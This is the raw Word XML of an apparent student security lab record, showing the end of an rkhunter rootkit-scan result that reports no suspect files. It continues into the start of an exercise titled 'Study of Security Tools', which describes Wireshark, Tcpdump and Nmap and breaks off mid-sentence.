        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="6200"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t>=== F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e prope</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>es ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cks...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>F</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es chec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>ed:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>136</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>spe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>checks...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="340"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1580" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>Roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cked :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>383</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="74"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>0</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spacing w:val="-1"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>pp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ons checks...</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="288" w:right="6890"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>cks sk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pped</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rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">checks </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ook:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and 57 seconds</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pPr>
      <w:r>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lt</w:t>
      </w:r>
      <w:r>
        <w:t>s have</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>been wr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>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360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="2484"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:t>ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ore warn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ngs have</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>been found wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>check</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he sys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>. P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ease ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ck </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>var</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="1" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>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spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-3"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>su</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t:</w:t>
      </w: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rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRDefault="00964394" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pP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 xml:space="preserve">Ex. No.:   </w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>17a</w:t>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t>Date:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>STUDY OF SECURITY TOOLS</w:t>
      </w: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Aim:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="259" w:lineRule="auto"/>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>To study the various tools used for security purpose in an organization.</w:t>
      </w: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Description:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48" w:firstLine="672"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>The important security tools used in any organization are: Wireshark, Tcpdump, Nmap, Aircrack-ng, GRR, Nikto, Snort, OSSEC and Metasploit. The description of each of these is covered in the following sections-</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Wireshark</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="48" w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>It is the most widely used network protocol analyzer. The flexibility and depth of inspection allows to analyze security events and troubleshoot network security device issues. Some of the important features of Wireshark are shown below:</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Deep inspection of hundreds of protocols</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Live capture and offline analysis</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Runs on multiple platform</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Capture files compressed with gzip can be decompressed on the fly</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Live data can be read from Ethernet, ATM, Bluetooth, USB, Token Ring etc.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="30"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="160" w:line="360" w:lineRule="auto"/>
        <w:ind w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Rich VoIP analysis</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:ind w:right="43"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pP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Tcpdump</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t>It is a common packet analyzer that runs under the command line. It allows the user to display TCP/IP and other packets being transmitted or received over a network to which the computer is attached. It works on most UNIX like OS. It uses the libpcap library to capture packets. It is also possible to use tcpdump for the specific purpose of intercepting and displaying the communications of another user or computer. A user with the necessary privileges on a system acting as a router or gateway through which unencrypted traffic such as Telnet or HTTP passes can use tcpdump to view login IDs, passwords, the URLs and content of websites being viewed or any other unencrypted information.</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Nmap</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00964394" w:rsidRPr="00964394" w:rsidRDefault="00964394" w:rsidP="00964394">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:ind w:left="48" w:right="48"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">It is a free and open source software for network discovery and security auditing. Many systems and network administrators use it for tasks such as network inventory, managing service </w:t>
      </w:r>
      <w:r w:rsidRPr="00964394">
        <w:rPr>
